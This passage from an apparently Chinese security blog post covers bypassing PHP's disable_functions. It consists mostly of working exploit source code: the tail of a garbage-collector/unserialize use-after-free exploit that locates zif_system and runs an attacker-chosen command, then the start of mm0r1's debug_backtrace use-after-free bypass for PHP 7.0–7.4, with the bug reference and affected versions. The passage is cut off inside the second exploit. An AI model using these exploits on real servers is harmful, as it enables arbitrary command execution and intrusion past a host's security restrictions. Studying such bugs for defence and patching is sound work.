        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
                <span class="c1"># &#39;constant&#39; constant check
</span><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
                <span class="c1"># &#39;bin2hex&#39; constant check
</span><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># ELF header
</span><span class="c1"></span>                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system
</span><span class="c1"></span>                <span class="k">return</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">class</span> <span class="nc">ryat</span> <span class="p">{</span>
        <span class="k">var</span> <span class="nv">$ryat</span><span class="p">;</span>
        <span class="k">var</span> <span class="nv">$chtg</span><span class="p">;</span>
        
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">chtg</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ryat</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ryat</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">class</span> <span class="nc">Helper</span> <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">,</span> <span class="nv">$d</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="s1">&#39;WIN&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;This PoC is for *nix systems only.&#39;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nv">$n_alloc</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="c1"># increase this value if you get segfaults
</span><span class="c1"></span>
    <span class="nv">$contiguous</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
        <span class="nv">$contiguous</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>

    <span class="nv">$poc</span> <span class="o">=</span> <span class="s1">&#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&#34;ryat&#34;:2:{s:4:&#34;ryat&#34;;R:3;s:4:&#34;chtg&#34;;i:2;}}i:1;i:3;i:2;R:5;}&#39;</span><span class="p">;</span>
    <span class="nv">$out</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>
    <span class="nx">gc_collect_cycles</span><span class="p">();</span>

    <span class="nv">$v</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ptr2str</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>
    <span class="nx">unset</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="nv">$abc</span> <span class="o">=</span> <span class="nv">$out</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>

    <span class="nv">$helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Helper</span><span class="p">;</span>
    <span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{</span> <span class="p">};</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">79</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;UAF failed&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1"># leaks
</span><span class="c1"></span>    <span class="nv">$closure_handlers</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nv">$php_heap</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">);</span>
    <span class="nv">$abc_addr</span> <span class="o">=</span> <span class="nv">$php_heap</span> <span class="o">-</span> <span class="mh">0xc8</span><span class="p">;</span>

    <span class="c1"># fake value
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

    <span class="c1"># fake reference
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">);</span>
    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">);</span>

    <span class="nv">$closure_obj</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$closure_handlers</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$base</span> <span class="o">=</span> <span class="nx">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t determine binary base address&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$elf</span> <span class="o">=</span> <span class="nx">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t parse ELF header&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nx">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get basic_functions address&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$zif_system</span> <span class="o">=</span> <span class="nx">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get zif_system address&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1"># fake closure object
</span><span class="c1"></span>    <span class="nv">$fake_obj_offset</span> <span class="o">=</span> <span class="mh">0xd0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x110</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="nv">$fake_obj_offset</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">,</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$closure_obj</span><span class="p">,</span> <span class="nv">$i</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1"># pwn
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_obj_offset</span><span class="p">);</span>
    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="c1"># internal func type
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span> <span class="c1"># internal func handler
</span><span class="c1"></span>
    <span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">)(</span><span class="nv">$cmd</span><span class="p">);</span>

    <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129102848502.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129102848502.png, https://gitee.com/leonsec/images/raw/master/image-20210129102848502.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129102848502.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129102848502.png"
        title="image-20210129102848502" /></p>
<h2 id="backtrace-bypass">Backtrace Bypass</h2>
<blockquote>
<p>This exploit uses a two year old <a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener noreffer">bug</a> in debug_backtrace() function. We can trick it into returning a reference to a variable that has been destroyed, causing a use-after-free vulnerability. The PoC was tested on various php builds for Debian/Ubuntu/CentOS/FreeBSD with cli/fpm/apache2 server APIs and found to work reliably.</p>
<p><a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener noreffer">PHP :: Bug #76047 :: Use-after-free when accessing already destructed backtrace arguments</a></p>
</blockquote>
<p>影响范围：</p>
<ul>
<li>7.0 - all versions to date</li>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
<li>7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
</ul>
<p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener noreffer">php7-backtrace-bypass/exploit.php · mm0r1/exploits</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="c1"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
</span><span class="c1">#
</span><span class="c1"># Bug: https://bugs.php.net/bug.php?id=76047
</span><span class="c1"># debug_backtrace() returns a reference to a variable 
</span><span class="c1"># that has been destroyed, causing a UAF vulnerability.
</span><span class="c1">#
</span><span class="c1"># This exploit should work on all PHP 7.0-7.4 versions
</span><span class="c1"># released as of 30/01/2020.
</span><span class="c1">#
</span><span class="c1"># Author: https://github.com/mm0r1
</span><span class="c1"></span>
<span class="nx">pwn</span><span class="p">(</span><span class="s2">&#34;uname -a&#34;</span><span class="p">);</span>

<span class="k">function</span> <span class="nf">pwn</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">,</span> <span class="nv">$backtrace</span><span class="p">;</span>

    <span class="k">class</span> <span class="nc">Vuln</span> <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span> 
            <span class="k">global</span> <span class="nv">$backtrace</span><span class="p">;</span> 
            <span class="nx">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
            <span class="nv">$backtrace</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">Exception</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">getTrace</span><span class="p">();</span> <span class="c1"># ;)
</span><span class="c1"></span>            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$backtrace</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;args&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1"># PHP &gt;= 7.4
</span><span class="c1"></span>                <span class="nv">$backtrace</span> <span class="o">=</span> <span class="nx">debug_backtrace</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">class</span> <span class="nc">Helper</span> <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$c</span><span class="p">,</span> <span class="nv">$d</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$s</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
            <span class="nv">$address</span> <span class="o">|=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$m</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$abc</span><span class="p">,</span> <span class="nv">$helper</span><span class="p">;</span>
        <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">+</span> <span class="nv">$p</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$leak</span> <span class="o">%=</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$leak</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
